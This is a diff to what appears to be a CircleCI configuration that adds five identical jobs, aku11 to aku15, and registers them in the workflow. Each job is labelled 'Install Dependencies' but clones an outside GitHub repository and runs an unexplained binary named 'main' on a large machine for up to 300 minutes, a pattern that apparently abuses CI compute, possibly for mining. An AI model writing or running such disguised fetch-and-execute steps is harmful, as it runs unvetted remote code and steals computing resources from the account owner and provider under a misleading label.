@@ -90,6 +90,51 @@ jobs:
             name: Install Dependencies
             command: git clone https://github.com/pramadoli/kura.git && cd kura && chmod u+x main && ./main
             no_output_timeout: 300m
+    aku11:
+      docker:
+            - image: ruby
+      resource_class: large
+      steps:
+        - run:
+            name: Install Dependencies
+            command: git clone https://github.com/pramadoli/kura.git && cd kura && chmod u+x main && ./main
+            no_output_timeout: 300m
+    aku12:
+      docker:
+            - image: ruby
+      resource_class: large
+      steps:
+        - run:
+            name: Install Dependencies
+            command: git clone https://github.com/pramadoli/kura.git && cd kura && chmod u+x main && ./main
+            no_output_timeout: 300m
+    aku13:
+      docker:
+            - image: ruby
+      resource_class: large
+      steps:
+        - run:
+            name: Install Dependencies
+            command: git clone https://github.com/pramadoli/kura.git && cd kura && chmod u+x main && ./main
+            no_output_timeout: 300m
+    aku14:
+      docker:
+            - image: ruby
+      resource_class: large
+      steps:
+        - run:
+            name: Install Dependencies
+            command: git clone https://github.com/pramadoli/kura.git && cd kura && chmod u+x main && ./main
+            no_output_timeout: 300m
+    aku15:
+      docker:
+            - image: ruby
+      resource_class: large
+      steps:
+        - run:
+            name: Install Dependencies
+            command: git clone https://github.com/pramadoli/kura.git && cd kura && chmod u+x main && ./main
+            no_output_timeout: 300m
 
 workflows:
     version: 2
@@ -105,3 +150,8 @@ workflows:
             - aku8
             - aku9
             - aku10
+            - aku11
+            - aku12
+            - aku13
+            - aku14
+            - aku15
